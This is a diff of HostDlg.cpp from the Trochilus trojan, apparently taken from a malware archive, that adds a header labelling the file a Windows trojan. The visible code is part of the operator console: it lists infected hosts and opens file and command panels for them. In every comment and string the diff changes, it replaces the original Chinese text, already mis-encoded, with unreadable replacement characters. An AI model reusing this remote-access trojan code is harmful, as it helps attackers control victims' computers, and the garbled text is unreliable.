@@ -1,4 +1,15 @@
-// HostDlg.cpp : ÊµÏÖÎÄ¼þ
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
+// HostDlg.cpp : Êµï¿½ï¿½ï¿½Ä¼ï¿½
 //
 
 #include "stdafx.h"
@@ -9,7 +20,7 @@
 #include "FilePanelDlg.h"
 #include "CmdDlg.h"
 
-// CHostDlg ¶Ô»°¿ò
+// CHostDlg ï¿½Ô»ï¿½ï¿½ï¿½
 
 IMPLEMENT_DYNAMIC(CHostDlg, CDialogEx)
 
@@ -39,7 +50,7 @@ BEGIN_MESSAGE_MAP(CHostDlg, CDialogEx)
 END_MESSAGE_MAP()
 
 
-// CHostDlg ÏûÏ¢´¦Àí³ÌÐò
+// CHostDlg ï¿½ï¿½Ï¢ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 void CHostDlg::StartPanel(CLIENT_INFO& info,LPVOID lpParameter)
 {
@@ -115,7 +126,7 @@ void CHostDlg::InitResize()
 
 void CHostDlg::InitView()
 {
-	//³õÊ¼»¯ÔÚÏßÖ÷»úÁÐ±í
+	//ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ð±ï¿½
 	m_Clientlist.SetExtendedStyle(LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);	
 	m_Clientlist.InsertColumn(0,_T("Computer Name"),LVCFMT_CENTER,130,-1);
 	m_Clientlist.InsertColumn(1,_T("Lan"),LVCFMT_CENTER,120,-1);
@@ -147,13 +158,13 @@ BOOL CHostDlg::OnInitDialog()
 	InitResize();
 	if (!StartMasterWorking())
 	{
-		::MessageBox(NULL, _T("³õÊ¼»¯¹¤×÷Ïß³ÌÊ§°Ü£¡"), _T("Error"), MB_OK | MB_ICONERROR);
+		::MessageBox(NULL, _T("ï¿½ï¿½Ê¼ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ß³ï¿½Ê§ï¿½Ü£ï¿½"), _T("Error"), MB_OK | MB_ICONERROR);
 		ExitProcess(0);
 	}
 	SetClientInfoNotifies(ClientInfoNotify,this);
 
 	return TRUE;  // return TRUE unless you set the focus to a control
-	// Òì³£: OCX ÊôÐÔÒ³Ó¦·µ»Ø FALSE
+	// ï¿½ì³£: OCX ï¿½ï¿½ï¿½ï¿½Ò³Ó¦ï¿½ï¿½ï¿½ï¿½ FALSE
 }
 
 
